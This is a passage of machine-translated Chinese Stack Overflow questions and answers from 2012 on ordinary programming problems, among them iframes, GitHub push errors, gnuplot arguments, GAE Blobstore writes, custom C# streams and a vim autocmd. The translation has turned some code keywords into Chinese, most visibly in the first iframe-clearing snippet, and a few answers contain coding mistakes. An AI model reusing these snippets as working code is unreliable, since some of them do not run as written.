就我而言，当我调用 clean_designEditor() 函数时，它会阻止我的下拉列表回发，否则它可以正常工作。我的也与 AJAX 弹出控制和防止回发和其他 AJAX/Javascript 请求有关。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-10T14:07:57.367

您必须使用以下代码

// 通过 iframe 的 id

var iframe = 帧["MyFrame"];

if(iframe.contentDocument) { doc = iframe.contentDocument; } 其他 { 文档 = iframe.contentWindow.document; }

doc.body.innerHTML = '';

快乐编码！

# github - Github：未找到存储库

> ID：12328591
> 
> 赞同：0
> 
> 时间：2012-09-08T06:26:34.603
> 
> 标签：github

```
$ git push -u origin master
ERROR: Repository not found.
fatal: The remote end hung up unexpectedly 
```

我很确定存储库在那里并且我正确添加了它。问题可能是我使用了两个 github 帐户。一个是我个人的，一个是给客户的。我正在尝试将它作为私有存储库放在客户的 github 上。

我能够创建一个存储库并将其推送到我的个人 github 帐户。但我无法将其推送到我客户的帐户。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T06:37:12.217

您可能无权推送到客户的存储库。要获得访问权限，最简单的方法是您的个人 GitHub 帐户可以访问您客户的存储库。

理想情况下，您客户的帐户是 GitHub 组织。这样，可以授予任意数量的人访问其功能的权限。只需将任何帐户添加为组织的所有者，或将帐户添加到团队以授予对特定存储库的访问权限。

如果您客户的帐户不是组织，您可以通过将您自己的帐户作为协作者添加到存储库（在存储库管理设置中）来授予自己访问权限。这使您可以从自己的帐户访问存储库。

* * *

如果您尝试使用多个 ssh 密钥登录到不同的 Github 帐户，具体取决于您推送到的存储库，请参阅[多个 GitHub 帐户和 SSH 配置](https://stackoverflow.com/questions/3225862/multiple-github-accounts-ssh-config)。然而，这更加困难并且可能是不必要的。

# javascript - 使元素在 iframe 中可拖动

> ID：12328593
> 
> 赞同：0
> 
> 时间：2012-09-08T06:27:01.933
> 
> 标签：javascript, jquery, html, iframe

我的一个网页中有一个 iframe。它指向同一域上的另一个页面。我一直在尝试使元素在其中可拖动，但遇到了麻烦。我昨晚让它工作了，但在保存该版本之前进行了一些更改，现在无法弄清楚我以前是如何拥有它的，所以我知道它可以完成。我现在有 iframe 突出显示元素，但是当我像以前一样将代码拖放到其中时，它不起作用。主页面中的代码是：

```
function init() {
var $head = $("#myframe").contents().find("head");
$head.append($("<link/>", { rel: "stylesheet", href: "http://ajax.googleapis.com     /ajax/libs/jqueryui/1.8/themes/base/jquery-ui.css", type: "text/css" }));
        $head.append($("<link/>", { rel: "javascript", href: "http://ajax.googleapis.com/ajax/libs/jquery/1.5/jquery.min.js", type: "text/javascript" }));
        $head.append($("<link/>", { rel: "javascript", href: "http://ajax.googleapis.com/ajax/libs/jqueryui/1.8/jquery-ui.min.js", type: "text/javascript" }));
        $head.append($("<link/>", { rel: "stylesheet", href: "my_styles.css", type: "text/css" }));
    }
    function iframeLoad() {
        $head.append($("<link/>", { rel: "javascript", href: "my_js.js", type: "text/javascript" }));
    } 
```

我的 jquery 拖放代码是：

```
 $(document).ready(function() {
   $("p").draggable();
  });
  $(document).ready(function() {
  $("h1").draggable();
  });
  $(document).ready(function() {
 $("div").draggable();
 }); 
```

网址是： http: [//johnverber.com/Opti/url.html](http://johnverber.com/Opti/url.html)，以防您想查看。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T06:29:45.827

不是您问题的完整答案，但无法清楚地在评论中做代码示例。你可以清理最后一点，你不需要检查 DOM 是否已经加载了 3 次。将其合并为一个：

```
$(document).ready(function () {
    $("p,h1,div").draggable();
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T07:51:53.057

看起来您正在为您的 js 文件创建“链接”标签，而它应该是“脚本”标签。

# c# - c# &mysql 连接中的错误消息“系统在尝试在调用中使用指针参数时检测到无效的指针地址”

> ID：12328594
> 
> 赞同：0
> 
> 时间：2012-09-08T06:27:03.330
> 
> 标签：c#, .net, mysql

嗨，我用 c# 开发了一个应用程序，并使用 mysql 作为后端。我使用 ADODB 连接到数据库。我使用 DSN 进行通信。

现在我有问题我必须安装在我的客户那里有 3 台机器互连 (LAN)。其中1个是XP，1个是win7的笔记本电脑，其他是win7的桌面。每件事都在笔记本电脑和 XP 机器上完美运行，但是当我尝试使用 win 7 在桌面上运行应用程序时，它会出现以下错误。实际上，我可以从其他两台机器上用 win7（这是作为服务器工作）连接到这个桌面。数据被正确插入。所以我不明白这台服务器机器有什么问题。我收到以下错误消息。

```
System.Net.Sockets.SocketException: The system detected an invalid pointer address in attempting to use a pointer argument in a call
at System.Net.Sockets.Socket.GetSocketOption(SocketOptionLevel optionLevel, SocketOptionName optionName)
at System.Net.Sockets.NetworkStream.get_ReadTimeout()
at MySql.Data.MySqlClient.TimedStream..ctor(Stream baseStream)
at MySql.Data.MySqlClient.MySqlStream..ctor(Stream baseStream, Encoding encoding, Boolean compress)
at MySql.Data.MySqlClient.NativeDriver.Open()
at MySql.Data.MySqlClient.Driver.Open()
at MySql.Data.MySqlClient.Driver.Create(MySqlConnectionStringBuilder settings)
at MySql.Data.MySqlClient.MySqlPool.CreateNewPooledConnection()
at MySql.Data.MySqlClient.MySqlPool.GetPooledConnection()
at MySql.Data.MySqlClient.MySqlPool.TryToGetDriver()
at MySql.Data.MySqlClient.MySqlPool.GetConnection()
at MySql.Data.MySqlClient.MySqlConnection.Open()
at construction.clsConnect..ctor()
at construction.frmNewSupplierEntryForm..ctor()
at construction.frmMainMenu.supplierToolStripMenuItem_Click(Object sender, EventArgs e)
at System.Windows.Forms.ToolStripItem.RaiseEvent(Object key, EventArgs e)
at System.Windows.Forms.ToolStripMenuItem.OnClick(EventArgs e)
at System.Windows.Forms.ToolStripItem.HandleClick(EventArgs e)
at System.Windows.Forms.ToolStripItem.HandleMouseUp(MouseEventArgs e)
at System.Windows.Forms.ToolStripItem.FireEventInteractive(EventArgs e, ToolStripItemEventType met)
at System.Windows.Forms.ToolStripItem.FireEvent(EventArgs e, ToolStripItemEventType met)
at System.Windows.Forms.ToolStrip.OnMouseUp(MouseEventArgs mea) 
```

如果有人纠正我的问题，那将是 gr8 的帮助。我想在这里提到的是，我在整个项目中根本没有使用过这个“Socket”相关代码。所以请指导我。由于这个问题，我完全被困住了。感谢您

# excel - 使用 Excel BigQuery 连接器时结果有限

> ID：12328597
> 
> 赞同：0
> 
> 时间：2012-09-08T06:27:41.220
> 
> 标签：excel, google-bigquery

我已使用 Excel 连接器从 BigQuery 中提取数据，但结果仅限于 230,000 条记录。

这是连接器的限制还是我没有正确完成的事情？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T23:20:49.167

BigQuery 的最大响应大小为 64MB（压缩后）。因此，根据行的大小，BigQuery 可以返回的最大响应大小很可能是 230,000。

在此处查看有关配额的更多信息： [https ://developers.google.com/bigquery/docs/quota-policy](https://developers.google.com/bigquery/docs/quota-policy)

用例是什么——您希望返回多少行？通常 BigQuery 用于大型聚合分析，而不是返回大量未聚合结果的结果。如果您也在寻找原始数据集，您可以将整个表格以 CSV 格式转储到 Google Cloud Storage 中。

此外，您可能想尝试在 UI 中运行查询： [https ://bigquery.cloud.google.com/](https://bigquery.cloud.google.com/)

# command-line - 如何将命令行参数传递给gnuplot？

> ID：12328603
> 
> 赞同：153
> 
> 时间：2012-09-08T06:28:34.343
> 
> 标签：command-line, gnuplot

我想使用 gnuplot 从数据文件中绘制图形，比如*foo.data*。目前，我在命令文件中硬编码数据文件名，比如*foo.plt*，然后运行命令`gnuplot foo.plg`来绘制数据。但是，我想将数据文件名作为命令参数传递，例如 running command `gnuplot foo.plg foo.data`。如何解析 gnuplot 脚本文件中的命令行参数？谢谢。

* * *

## 回答 #1

> 赞同：202
> 
> 时间：2012-09-08T11:49:38.037

您可以通过开关输入变量`-e`

```
$ gnuplot -e "filename='foo.data'" foo.plg 
```

在 foo.plg 中，您可以使用该变量

```
$ cat foo.plg 
plot filename
pause -1 
```

要使“foo.plg”更通用一点，请使用条件：

```
if (!exists("filename")) filename='default.dat'
plot filename
pause -1 
```

请注意，`-e`必须在文件名之前，否则文件在`-e`语句之前运行。特别是，`#!/usr/bin/env gnuplot`使用`./foo.plg -e ...`CLI 参数运行 shebang gnuplot 将忽略使用提供的参数。

* * *

## 回答 #2

> 赞同：68
> 
> 时间：2015-08-04T16:54:32.120

从 5.0 版开始，您可以使用标志将参数传递给 gnuplot 脚本`-c`。这些参数是通过变量`ARG0`来访问的`ARG9`，`ARG0`即脚本，以及`ARG1`字符串`ARG9`变量。参数的数量由 给出`ARGC`。

例如，以下脚本（“script.gp”）

```
#!/usr/local/bin/gnuplot --persist

THIRD=ARG3
print "script name        : ", ARG0
print "first argument     : ", ARG1
print "third argument     : ", THIRD 
print "number of arguments: ", ARGC 
```

可以称为：

```
$ gnuplot -c script.gp one two three four five
script name        : script.gp
first argument     : one
third argument     : three
number of arguments: 5 
```

或在 gnuplot 中作为

```
gnuplot> call 'script.gp' one two three four five
script name        : script.gp
first argument     : one
third argument     : three
number of arguments: 5 
```

* * *

在 gnuplot 4.6.6 及更早版本中，存在一种`call`具有不同（现已弃用）语法的机制。参数通过`$#`, `$0`,...,访问`$9`。例如，上面的相同脚本如下所示：

```
#!/usr/bin/gnuplot --persist

THIRD="$2"
print "first argument     : ", "$0"
print "second argument    : ", "$1"
print "third argument     : ", THIRD
print "number of arguments: ", "$#" 
```

它在 gnuplot 中被称为（记住，版本 <4.6.6）

```
gnuplot> call 'script4.gp' one two three four five
first argument     : one
second argument    : two
third argument     : three
number of arguments: 5 
```

请注意，脚本名称没有变量，`$0`第一个参数也是如此，变量在引号内调用。没有办法直接从命令行使用它，只能通过@con-fu-se 建议的技巧。

* * *

## 回答 #3

> 赞同：28
> 
> 时间：2012-09-08T10:24:04.703

您还可以按照[此处](https://sourceforge.net/p/gnuplot/mailman/message/25432288/)的建议通过环境传递信息。*Ismail Amin*的例子在这里重复：

在外壳中：

```
export name=plot_data_file 
```

在 Gnuplot 脚本中：

```
#! /usr/bin/gnuplot

name=system("echo $name")
set title name
plot name using ($16 * 8):20 with linespoints notitle
pause -1 
```

* * *

## 回答 #4

> 赞同：23
> 
> 时间：2014-06-17T20:29:03.393

Jari Laamanen 的回答是最好的解决方案。我只想解释如何将 1 个以上的输入参数与 shell 变量一起使用：

```
output=test1.png
data=foo.data
gnuplot -e "datafile='${data}'; outputname='${output}'" foo.plg 
```

和 foo.plg：

```
set terminal png
set outputname 
f(x) = sin(x)
plot datafile 
```

如您所见，更多参数用分号传递（如在 bash 脚本中），但字符串变量需要用 ' ' 封装（gnuplot 语法，而不是 Bash 语法）

* * *

## 回答 #5

> 赞同：14
> 
> 时间：2013-12-09T12:20:02.597

您可以在 unix/linux 环境中使用技巧：

1.  在 gnuplot 程序中： plot "/dev/stdin" ...

2.  在命令行中：gnuplot program.plot < data.dat

* * *

## 回答 #6

> 赞同：12
> 
> 时间：2016-10-27T06:01:23.827

这个问题得到了很好的回答，但我想我可以在这里找到一个合适的位置来填补，如果只是为了减少像我一样在谷歌上搜索的人的工作量。vagoberto 的回答给了我解决这个问题的版本所需的东西，所以我将在这里分享我的解决方案。

我在最新的环境中开发了一个绘图脚本，它允许我这样做：

```
#!/usr/bin/gnuplot -c 
set terminal png truecolor transparent crop
set output ARG1
set size 1, 0.2
rrLower = ARG2
rrUpper = ARG3
rrSD = ARG4
resultx = ARG5+0 # Type coercion required for data series
resulty = 0.02 # fixed
# etc. 
```

这在最近使用 gnuplot（在我的例子中为 5.0.3）的环境中从命令行执行得非常好。

```
$ ./plotStuff.gp 'output.png' 2.3 6.7 4.3 7 
```

当上传到我的服务器并执行时，它失败了，因为服务器版本是 4.6.4（当前在 Ubuntu 14.04 LTS 上）。下面的垫片解决了这个问题，而不需要对原始脚本进行任何更改。

```
#!/bin/bash
# GPlot v<4.6.6 doesn't support direct command line arguments.
#This script backfills the functionality transparently.
SCRIPT="plotStuff.gp"
ARG1=$1
ARG2=$2
ARG3=$3
ARG4=$4
ARG5=$5
ARG6=$6

gnuplot -e "ARG1='${ARG1}'; ARG2='${ARG2}'; ARG3='${ARG3}'; ARG4='${ARG4}'; ARG5='${ARG5}'; ARG6='${ARG6}'" $SCRIPT 
```

这两个脚本的组合允许将参数从 bash 传递到 gnuplot 脚本，而不考虑 gnuplot 版本和基本上任何 *nix。

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2013-12-06T17:11:12.497

你甚至可以做一些 shell 魔术，例如：

```
#!/bin/bash
inputfile="${1}" #you could even do some getopt magic here...

################################################################################
## generate a gnuplotscript, strip off bash header
gnuplotscript=$(mktemp /tmp/gnuplot_cmd_$(basename "${0}").XXXXXX.gnuplot)

firstline=$(grep -m 1 -n "^#!/usr/bin/gnuplot" "${0}")
firstline=${firstline%%:*} #remove everything after the colon
sed -e "1,${firstline}d" < "${0}" > "${gnuplotscript}"

################################################################################
## run gnuplot
/usr/bin/gnuplot -e "inputfile=\"${inputfile}\"" "${gnuplotscript}"
status=$?
if [[ ${status} -ne 0 ]] ; then
  echo "ERROR: gnuplot returned with exit status $?"
fi

################################################################################
## cleanup and exit
rm -f "${gnuplotscript}"
exit ${status}

#!/usr/bin/gnuplot
plot inputfile using 1:4 with linespoints
#... or whatever you want 
```

我的实现有点复杂（例如，在 sed 调用中替换一些魔术标记，而我已经这样做了......），但我简化了这个例子以便更好地理解。你也可以让它更简单.... YMMV。

* * *

## 回答 #8

> 赞同：5
> 
> 时间：2017-04-20T15:16:47.170

在shell中写

```
gnuplot -persist -e "plot filename1.dat,filename2.dat" 
```

并连续获得您想要的文件。-persist 用于使 gnuplot 屏幕保持不变，只要用户不手动退出它。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2020-03-18T19:56:27.943

**如果您需要位置参数**， @vagoberto 的回答似乎是最好的恕我直言，我还有一点要补充的改进。

vagoberto 的建议：

```
#!/usr/local/bin/gnuplot --persist

THIRD=ARG3
print "script name        : ", ARG0
print "first argument     : ", ARG1
print "third argument     : ", THIRD 
print "number of arguments: ", ARGC 
```

被调用：

```
$ gnuplot -c script.gp one two three four five
script name        : script.gp
first argument     : one
third argument     : three
number of arguments: 5 
```

对于像我这样的懒惰打字员，可以使脚本可执行（`chmod 755 script.gp`）

然后使用以下内容：

```
#!/usr/bin/env gnuplot -c

THIRD=ARG3
print "script name        : ", ARG0
print "first argument     : ", ARG1
print "third argument     : ", THIRD
print "number of arguments: ", ARGC 
```

并将其执行为：

```
$ ./imb.plot a b c d
script name        : ./imb.plot
first argument     : a
third argument     : c
number of arguments: 4 
```

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2014-06-21T14:09:30.613

还有一种方式是这样的：

您有一个名为的 gnuplot 脚本`scriptname.gp`：

```
#!/usr/bin/gnuplot -p
# This code is in the file 'scriptname.gp'
EPATH = $0
FILENAME = $1 

plot FILENAME 
```

`scriptname.gp`现在您可以通过这种复杂的语法和平调用 gnuplot 脚本：

```
echo "call \"scriptname.gp\" \"'.'\" \"'data.dat'\"" | gnuplot 
```

# c# - 向上拖动鼠标时，RichTextBox SelectionLength 发生了奇怪的变化

> ID：12328611
> 
> 赞同：0
> 
> 时间：2012-09-08T06:30:19.490
> 
> 标签：c#, winforms, richtextbox

在表单中放置一个 RichTextBox 后（使用 VS 2008 并使用默认值），我可以输入文本并选择它，无论是从头到尾拖动鼠标还是首先选择文本的结尾并拖动到开头。但是，如果我将 SelectionChanged 中的 RichTextBox SelectionStart 属性设置为其值，则从输入文本的末尾拖动到开头时，选择不会正确突出显示。它一次突出显示（选择）一个单词。为什么？

```
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace WindowsFormsApplication1
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void richTextBox1_SelectionChanged(object sender, EventArgs e)
        {
            // With this line, text is not selected properly with dragging "up".
            // It is selected when dragging down.  Why?
            richTextBox1.SelectionStart = richTextBox1.SelectionStart;
        }
    }
} 
```

# javascript - 什么是谷歌地图的 javascript 加载策略

> ID：12328616
> 
> 赞同：1
> 
> 时间：2012-09-08T06:31:39.913
> 
> 标签：javascript

当我使用谷歌地图时，我对它的实现很感兴趣，所以我使用萤火虫来检查。

然后我发现它的 javascript 加载策略相当有趣。以这个页面为例：

[叠加示例](https://developers.google.com/maps/documentation/javascript/examples/polygon-simple)

然后当我第一次打开这个页面时，会加载以下js：

```
https://maps.googleapis.com/maps/api/js?sensor=false
https://maps.gstatic.com/intl/en_us/mapfiles/api-3/9/13b/main.js
https://maps.gstatic.com/cat_js/intl/en_us/mapfiles/api-3/9/13b/%7Bcommon,map,util,poly%7D.js
https://maps.gstatic.com/cat_js/intl/en_us/mapfiles/api-3/9/13b/%7Bonion,geometry%7D.js 
```

但是如果我刷新页面（使用 ctrl+f5），会加载以下 js：

```
https://maps.googleapis.com/maps/api/js?sensor=false
https://maps.gstatic.com/intl/en_us/mapfiles/api-3/9/13b/main.js 
```

但是页面仍然有效，覆盖在地图中绘制。但是 poly.js 等在哪里？

另外，谁能告诉我如何按组件加载js？例如`common` `util` `poly`示例中的。

当我编写不同的组件时我应该知道什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T06:35:42.587

**1.**当 poly.js 加载时，它会传递一个字符串到`google.maps.__gjsload___`.

这是一段摘录：

`google.maps.__gjsload__('common', '\'use strict\';var Ai=isNa...`

文件的其余部分只是该字符串的内容。

我的预感是这个函数可能会存储这个字符串，`localStorage`或者`sessionStorage`只需要检索一次。

**2.**另外，如果您想了解如何根据需要加载 js 文件，请查看[**AMD**](https://github.com/amdjs/amdjs-api/wiki/AMD)和/或 CommonJS: [**Modules**](http://wiki.commonjs.org/wiki/Modules/1.1)。

AMD 的一个很好的实现（我的偏好）是[RequireJS](http://requirejs.org/)。

## 更新

我做了一些探索，并且`localStorage`似乎`sessionStorage`没有在此页面上使用。我也无法复制你的结果。在 Firebug 中，poly.js 总是为我加载。某处可能发生了一些魔法，但我没有看到。

但是，完全可以将字符串存储在`localStorage`其中并`sessionStorage`进行检索，而无需进行额外的 js 调用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T06:50:16.853

> 另外，谁能告诉我如何按组件加载js？

这涉及到异步 javascript 文件加载的主题。如果您曾经使用过一种可以在脚本中的任何位置“包含”文件的语言，那么您就会明白 javascript 没有此功能。正因为如此，通过脚本标签注入，就有了“aysnc javascript 添加”的整个范例。

脚本标签注入：您动态地制作一个脚本标签，并将其源设置为您需要的文件，并将该标签插入到 DOM 中，瞧，一个新文件已被加载并执行。对于 javascript 繁重的应用程序，这很常见，尤其是在加载第三方应用程序时。谷歌一直在做这件事，看看谷歌分析的包含脚本就是一个很好的例子。

现在，由于这是一种敏感而微妙的编码类型，一些“javascript 组件/模块/资产加载”框架对其进行了改进并使其非常稳定。common.js、require.js 等在这方面都做得很好。

> 当我编写不同的组件时我应该知道什么？

对于您使用谷歌地图所做的事情，您并不需要了解太多。但是如果你进入 javascript 模块模式开发，你需要知道这一点：确保你保护你的全局命名空间不被你自己的变量弄乱，所以尽可能将你所有的工作封装在闭包中，并且（推荐但不是必需的）开始它们都带有a `;`，因此如果它们被乱序加载，它们就不会相互破坏。

# google-app-engine - 将字节数组写入 GAE Blobstore

> ID：12328622
> 
> 赞同：0
> 
> 时间：2012-09-08T06:32:43.763
> 
> 标签：google-app-engine, blobstore, zipinputstream

我能够读取字节并在系统控制台上打印出来。然而，由于 GAE 不支持文件创建，我通过 StackOverflow 搜索并发现我可以写入 GAE blobstore。但我不确定如何去做，因为我是 GAE 的新手。

```
public void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {
    resp.setContentType("text/html;charset=UTF-8");
    // resp.setContentType("text/plain");
    PrintWriter out = resp.getWriter();
    try {
        ServletFileUpload upload = new ServletFileUpload();
        FileItemIterator iterator = upload.getItemIterator(req);
        // out.println("<html><body>");

        while (iterator.hasNext()) {
            FileItemStream item = iterator.next();
            InputStream in = item.openStream();

            if (item.isFormField()) {
                out.println("<br />Got a form field: " + item.getFieldName());
            } else {
                out.println("<br />Got an uploaded file: " + item.getFieldName() + ", name = " + item.getName());

                ZipInputStream zis = new ZipInputStream(
                new BufferedInputStream( in ));

                ZipEntry entry;

                // Read each entry from the ZipInputStream until no
                // more entry found indicated by a null return value
                // of the getNextEntry() method.

                byte[] buf = new byte[10244];
                int len;
                while ((entry = zis.getNextEntry()) != null) {

                    out.println("Unzipping: " + entry.getName());

                    FileService fileService = FileServiceFactory.getFileService();

                    AppEngineFile file = fileService.createNewBlobFile("text/plain");

                    boolean lock = false;
                    FileWriteChannel writeChannel = fileService.openWriteChannel(file, lock);

                    PrintWriter outter = new PrintWriter(Channels.newWriter(writeChannel, "UTF8"));

                    StringBuilder sb = new StringBuilder(buf.length);
                    if (entry.getName().equalsIgnoreCase("booking.csv")) {
                        int count = 0;
                        while ((len = zis.read(buf, 0, buf.length)) != -1) {
                            //I'm trying to write byte[] into blobstore instead of printing using
                            //System.out.write(buf, 0, len);
                        } 
```

有什么建议吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T08:19:20.447

试试这个：

```
FileWriteChannel writeChannel = fileService.openWriteChannel(file, lock);
while ((len = zis.read(buf, 0, buf.length)) != -1) {
    writeChannel. write(ByteBuffer.wrap(buf, 0, len), null);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-28T09:32:49.447

最简单的方法：

```
 import com.google.appengine.api.files.FileService;
  import com.google.appengine.api.files.AppEngineFile;
  import com.google.appengine.api.files.FileWriteChannel;
  import com.google.appengine.api.blobstore.BlobKey;
  import com.google.appengine.api.images.ImagesServiceFactory;
  import com.google.appengine.api.images.ServingUrlOptions;
  ...

  // your data in byte[] format
  byte[] data = image.getData();
  /**
   *  MIME Type for
   *  JPG use "image/jpeg" for PNG use "image/png"
   *  PDF use "application/pdf"
   *  see more: https://en.wikipedia.org/wiki/Internet_media_type
   */
  String mimeType = "image/jpeg";

  // save data to Google App Engine Blobstore 
  FileService fileService = FileServiceFactory.getFileService();
  AppEngineFile file = fileService.createNewBlobFile(mimeType); 
  FileWriteChannel writeChannel = fileService.openWriteChannel(file, true);
  writeChannel.write(java.nio.ByteBuffer.wrap(data));
  writeChannel.closeFinally();

  // your blobKey to your data in Google App Engine BlobStore
  BlobKey blobKey = fileService.getBlobKey(file);

  // THANKS TO BLOBKEY YOU CAN GET FOR EXAMPLE SERVING URL FOR IMAGES

  // Get the image serving URL (in https:// format)
  String imageUrl =
      ImagesServiceFactory.getImagesService().getServingUrl(
        ServingUrlOptions.Builder.withBlobKey(blobKey
              ).secureUrl(true)); 
```

# c# - 实现自定义流

> ID：12328623
> 
> 赞同：15
> 
> 时间：2012-09-08T06:32:53.497
> 
> 标签：c#, stream

我正在调用一个写入流的 dll。dll 中方法的签名如下所示：

```
public bool SomeMethod(Stream stream); 
```

并且该方法基本上会将二进制数据写入该流。因此，如果我将该方法称为：

```
var file = System.IO.File.Create("SomeFile.txt");
/* call dll method */ SomeMethod(file); 
```

然后我将基本上将输出写入该文件。在这个问题中，我将输出写入 networkStream。

**无论如何，回到问题上来**。我想创建自己的流的原因是因为我想知道某些事件何时发生。例如，如果我在哪里创建自己的流类：

```
class MyStream : Stream
{
    private long Position;

    public override int Read(byte[] buffer, int offset, int count)
    {

            // implementation goes here

            /* HERE I COULD CALL A CUSTOM EVENT */
    }

    public override long Seek(long offset, SeekOrigin origin)
    {
        // SAME THING I WILL LIKE TO PERFORM AN ACTION IF THIS METHOD IS CALLED!
    }

    // etc implement rest of abstract methods.... 
```

我正在将该流的输出写入网络，因此如果发生某些事件，我可能想放慢速度。如果我在哪里可以控制 dll，那么我就不会尝试实现这一点。

如果有人可以向我展示如何实现抽象流类的抽象方法的非常基本的示例，我将不胜感激。

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-09-08T06:41:26.043

最简单的自定义流是“包装”其他一些流的流（类似于压缩流）。每个方法都会简单地将其实现重定向到内部流。

```
class MyStream : Stream
{
 Stream inner;
 public MyStream(Stream inner)
 {
  this.inner = inner;
 }

 public override int Read(byte[] buffer, int offset, int count) 
 { 
    var result = inner.Read(buffer, offset, count);

            /* HERE I COULD CALL A CUSTOM EVENT */ 
   return result;
 } 
///
} 
```

使用示例：`functionThatTakesStream(new MyStream(new MemoryStream());`.

真正的代码需要在触发事件之前/之后处理内部流操作中的异常，并正确处理 IDisposable。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-08T06:40:23.283

如果您只想在调用 Read、Seek 或类似方法时触发事件，请覆盖基类版本，直接调用它们并在之前或之后引发适当的事件。如果您在编写流类方面需要帮助，请查看[http://referencesource.microsoft.com/netframework.aspx](http://referencesource.microsoft.com/netframework.aspx)上提供的 .Net 代码本身。但是，如果您想将流解析为更具可读性的内容，请考虑创建一个`IEnumerable<MyClass>`读取并处理流的方法。

# java - 在 JFrame 中调整 JPanel 的大小

> ID：12328627
> 
> 赞同：3
> 
> 时间：2012-09-08T06:34:10.503
> 
> 标签：java, swing, netbeans, jpanel, cardlayout

我是 Java 新手，开始学习摇摆，在 JFrame 中调整 JPanel 的大小时遇到​​了问题。我正在关注本教程：

[http://vincentramdhanie.blogspot.com/2009/11/cardlayout-with-netbeans.html](http://vincentramdhanie.blogspot.com/2009/11/cardlayout-with-netbeans.html)

因为最终我正在学习每种不同的布局，并且现在已经来到 CardLayout。在上面，有一个 JPanel 用于状态面板。这也是我想要做的，但是当我将 JPanel 拖到我的空白 JForm 上时，它会占用所有空间，并且我看不到任何调整大小的句柄，就像我使用 .NET 面板时一样。在属性窗口中更改 preferredSize 也无济于事。我在这里想念什么？问这么一个基本问题，我觉得自己完全是个菜鸟，但我真的找不到任何方法来调整这个东西的大小.. :-|

**编辑：**

我忘了提；我正在使用 NetBeans IDE

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-08T07:12:08.143

您无法调整 的大小，`JComponent`因为您选择了`CardLayout`。`CardLayout`可以容纳/管理一个或多个共享相同显示空间的组件。

您需要阅读[文档和好的教程](http://docs.oracle.com/javase/tutorial/uiswing/layout/card.html)。

# android - Xoom 和 HTC 手机上的 Drawable-mpdi

> ID：12328633
> 
> 赞同：0
> 
> 时间：2012-09-08T06:36:00.007
> 
> 标签：android, android-layout, android-widget, drawable

我正在为 Mobiles(HTC) 和 Motorola Xoom 开发应用程序。但我面临的问题是两者都使用 Drawable-mpdi 位图。abd两者的屏幕尺寸存在差异，在移动设备上完美的图像在平板电脑上变得非常小。

我检查了[设备使用的可绘制文件夹列表。](http://blog.blundell-apps.com/list-of-android-devices-with-pixel-density-buckets/) 请帮我解决这个问题？如何为两种设备制作不同尺寸的图像。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T06:44:47.060

我可以想到几种方法来做到这一点。希望其他人会添加更多。

您可以将 MDPI 文件夹与具有足够高分辨率的单个图像一起用于平板电脑，然后让 Android 使用 ImageView 的缩放属性为较小的设备缩放它。但是，您只关注 HTC 和 Xoom，这并不能解决使用其他通用分辨率的设备的问题。

或者，您可以使用 drawable-nodpi 文件夹并拥有多个具有您自己的分辨率命名方案的图像，例如 myimagesmall.bmp、myimagemedium.bmp 等。然后在运行时测量设备屏幕尺寸和 DPI 并加载适当的图像。

或者，将它们组合起来。使用 nodpi 和单个图像，让 Android 为您扩展。使用 BitmapFactory，您可以控制抖动和抗锯齿以获得良好的效果。

祝你好运！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-08T06:44:04.050

谈到密度，摩托罗拉 XOOM 也使用 mdpi 绘图，因此要区分平板电脑和小型手机之间的绘图，您应该使用与屏幕尺寸相关的文件夹。手机屏幕尺寸通常被视为正常，而 10 英寸平板电脑是 xlarge，因此 drawable-xlarge-mdpi 是您应该用于放置 10 英寸平板电脑的可绘制对象的文件夹名称。希望这可以帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-08T07:24:41.000

来自[http://developer.android.com/guide/practices/screens_support.html](http://developer.android.com/guide/practices/screens_support.html)

> 可用于提供特定于大小的资源的配置限定符有 small、normal、large 和 xlarge。例如，超大屏幕的布局应该放在 layout-xlarge/ 中。
> 
> 从 Android 3.2（API 级别 13）开始，不推荐使用上述大小组，您应该改用 swdp 配置限定符来定义布局资源所需的最小可用宽度。例如，如果您的多窗格数位板布局需要至少 600dp 的屏幕宽度，则应将其放置在 layout-sw600dp/ 中。使用新技术声明布局资源将在关于

# vim - 避免在 .vimrc 中的 autcmd BufWritePre 上移动光标

> ID：12328641
> 
> 赞同：5
> 
> 时间：2012-09-08T06:37:16.213
> 
> 标签：vim

我的`.vimrc`.

```
autocmd BufWritePre * silent! v/\_s*\S/d 
```

这会在保存时去除文件末尾的空行。问题是，当它剥离行时，它也会将光标移动到文件的最后一行。有没有办法避免修改光标位置？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-08T07:46:47.467

```
function! <SID>DelEmptyLinesEnd()
    let l = line(".")
    let c = col(".")
    v/\_s*\S/d
    call cursor(l, c)
endfunction

autocmd BufWritePre * :call <SID>DelEmptyLinesEnd() 
```

# android - 隐藏软键盘的方法不影响android中edittext的功能

> ID：12328644
> 
> 赞同：11
> 
> 时间：2012-09-08T06:37:48.393
> 
> 标签：android, android-edittext, hide, soft-keyboard

